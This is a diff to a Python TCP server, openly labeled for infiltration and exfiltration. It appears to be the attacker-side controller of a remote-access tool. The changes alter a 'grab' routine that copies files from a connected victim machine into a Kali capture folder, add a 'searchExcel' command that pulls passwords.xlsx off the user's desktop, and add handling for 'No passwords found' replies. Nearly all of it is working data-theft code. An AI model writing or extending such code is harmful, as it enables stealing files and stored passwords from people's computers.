@@ -1,17 +1,18 @@
 # TCP bidirectional Data transfer (Infiltration and Exfiltration) - Server
 import socket
 import os
-# import pandas as pd
 
 
 def doGrab(conn, command, operation):
-    conn.send(command.encode())
+    #conn.send(command.encode())
 
     # For grab operation, open a file in write mode, inside GrabbedFiles folder
     # File name should be of format: grabbed_sourceFilePathOfClientMachine
     # File name example: grabbed_C:/Users/John/Desktop/audit.docx
     if operation == "grab":
+        current_user = os.getlogin()
         grab, sourcePathAsFileName = command.split("*")
+        # path = f"C:\\Users\\{current_user}\\Downloads\\"
         path = "/home/kali/Desktop/CapturedFiles/"
         fileName = "captured_" + sourcePathAsFileName
 
@@ -25,7 +26,13 @@ def doGrab(conn, command, operation):
             print("Written to: " + path)
             print("[+] Transfer completed")
             break
-        if b"File not found" in data:
+        elif b"No .xlsx files found" in data:
+            print("[!] No Excel files could be found")
+            break
+        elif b"No passwords found" in data:
+            print("[!] No passwords could be found")
+            break
+        elif b"File not found" in data:
             print("[!] Files could not be found")
             break
         f.write(data)
@@ -71,6 +78,7 @@ def connect():
         # Command format: grab*<File Path>
         # Example: grab*C:\Users\John\Desktop\photo.jpeg
         elif "grab" in command:
+            conn.send(command.encode())
             doGrab(conn, command, "grab")
 
         # Command format: send*<destination path>*<File Name>
@@ -84,7 +92,7 @@ def connect():
 
         elif "searchExcel" in command:
             conn.send(command.encode())
-            doGrab(conn, "grab*passwords.xlsx", "grab")
+            doGrab(conn, "grab*passwords.xlsx", "grab") # grabs excel file off of the users desktop
 
         else:
             conn.send(command.encode())
